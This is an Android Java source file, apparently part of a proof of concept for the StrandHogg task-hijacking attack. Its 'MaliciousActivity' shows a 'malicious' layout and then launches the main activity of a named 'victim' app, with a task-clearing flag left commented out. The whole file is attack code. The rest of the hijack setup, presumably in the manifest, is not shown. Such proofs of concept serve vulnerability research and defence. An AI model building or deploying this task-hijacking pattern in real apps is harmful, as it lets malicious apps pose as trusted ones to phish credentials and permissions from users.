package com.strandhogg.v1;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

import static android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK;

public class MaliciousActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_malicious);

        Intent victimApp = new Intent(Intent.ACTION_MAIN);
        //victimApp.addFlags(FLAG_ACTIVITY_CLEAR_TASK);
        victimApp.setComponent(new ComponentName("com.ActivityCounter", "com.ActivityCounter.MainActivity"));

        startActivity(victimApp);
    }
}